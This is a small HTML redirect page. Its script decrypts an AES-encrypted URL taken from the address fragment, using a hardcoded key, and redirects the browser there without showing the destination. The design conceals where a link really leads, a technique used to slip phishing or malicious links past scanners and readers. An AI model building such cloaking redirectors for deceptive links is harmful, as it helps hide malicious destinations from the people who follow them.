<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<title>Redirecting...</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<style>
  body {
    background: black;
    color: white;
    font-family: 'Share Tech Mono', monospace;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    font-size: 16px;
  }
</style>
</head>
<body>
  Перенаправляем...
  <script>
    const key = CryptoJS.enc.Utf8.parse("MySecretKey12345");

    function decryptLink(enc) {
      try {
        const raw = CryptoJS.enc.Base64.parse(enc);
        const iv = CryptoJS.lib.WordArray.create(raw.words.slice(0, 4));
        const ct = CryptoJS.lib.WordArray.create(raw.words.slice(4), raw.sigBytes - 16);
        const decrypted = CryptoJS.AES.decrypt({ ciphertext: ct }, key, {
          iv: iv,
          mode: CryptoJS.mode.CBC,
          padding: CryptoJS.pad.Pkcs7
        });
        return decrypted.toString(CryptoJS.enc.Utf8);
      } catch(e) {
        return null;
      }
    }

    // Получаем хеш из URL (после #)
    const encLink = window.location.hash.slice(1);
    const realLink = decryptLink(encLink);

    if (realLink) {
      window.location.replace(realLink);
    } else {
      document.body.textContent = "Ошибка редиректа.";
    }
  </script>
</body>
</html>
